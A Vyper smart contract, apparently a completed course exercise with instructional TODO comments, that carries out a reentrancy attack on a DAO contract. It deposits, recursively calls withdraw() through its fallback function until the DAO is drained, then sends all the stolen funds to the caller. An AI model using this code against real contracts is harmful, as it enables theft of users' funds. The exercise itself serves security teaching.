interface DAO:
    def deposit() -> bool: payable
    def withdraw() -> bool: nonpayable
    def userBalances(addr: address) -> uint256: view

dao_address: public(address)
owner_address: public(address)

@external
def __init__():
    self.dao_address = ZERO_ADDRESS
    self.owner_address = ZERO_ADDRESS

@internal
def _attack() -> bool:
    assert self.dao_address != ZERO_ADDRESS
    
    # TODO: Use the DAO interface to withdraw funds.
    # Make sure you add a "base case" to end the recursion
    if self.dao_address.balance > 0:
        DAO(self.dao_address).withdraw()
    return True

@external
@payable
def attack(dao_address:address):
    self.dao_address = dao_address
    amount: uint256 = msg.value    
 

    if dao_address.balance < msg.value:
        amount= dao_address.balance
    # TODO: make the deposit into the DAO   
    DAO(self.dao_address).deposit(value=amount)
    # TODO: Start the reentrancy attack
    self._attack()
    # TODO: After the recursion has finished, all the stolen funds are held by this contract. Now, you need to send all funds (deposited and stolen) to the entity that called this contract
    send(msg.sender, self.balance)
    

@external
@payable
def __default__():
    
    # TODO: Add code here to complete the recursive call
    if self.dao_address == msg.sender:
        self._attack()